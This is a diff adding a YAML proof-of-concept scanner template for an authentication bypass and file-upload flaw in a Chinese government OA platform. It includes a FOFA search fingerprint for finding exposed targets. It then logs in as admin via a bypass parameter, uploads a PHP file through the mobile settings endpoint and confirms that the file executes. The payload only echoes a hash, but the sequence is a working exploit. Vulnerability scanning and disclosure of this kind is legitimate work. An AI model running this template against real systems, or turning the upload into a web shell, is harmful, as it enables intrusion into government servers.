@@ -1,0 +1,44 @@
+id: poc-yaml-szt-smart-governmet-setting-upload
+info:
+  name: 数字通云平台智慧政务后台setting 文件上传漏洞
+  severity: high
+  tags:
+  - 权限绕过
+  finger: 数字通云平台智慧政务OA
+  fofa: body="assets/8cca19ff/css/bootstrap-yii.css"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /portal/default/login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: userID=admin&flag=rone
+  output:
+  - regex_match(headers,"GOASESSID=(?P<cookie1>.*?);")
+  - regex_match(headers,`(?P<cookie2>.*?); expires`)
+  expression: "status_code == 302 && \nbody == \"\"\n"
+- method: POST
+  path: /sys/mobile/setting
+  headers:
+    Cookie: GOASESSID={{.cookie1}};{{.cookie2}}
+    Content-Type: multipart/form-data; boundary=---------------------------318638034016337576332132513456
+    X-Requested-With: XMLHttpRequest
+  data: '-----------------------------318638034016337576332132513456
+
+    Content-Disposition: form-data; name="MobileApplication[cert]"; filename="{{.t1}}.php"
+
+    Content-Type: application/octet-stream
+
+
+    <?php echo md5({{.t1}});?>
+
+    -----------------------------318638034016337576332132513456--
+
+    '
+  expression: "status_code == 200 && \ncontains(title,\"移动应用设置\")\n"
+- method: GET
+  path: /static/seal/{{.t1}}.php
+  expression: "status_code == 200 && \nbody == t2\n"
+transport: http
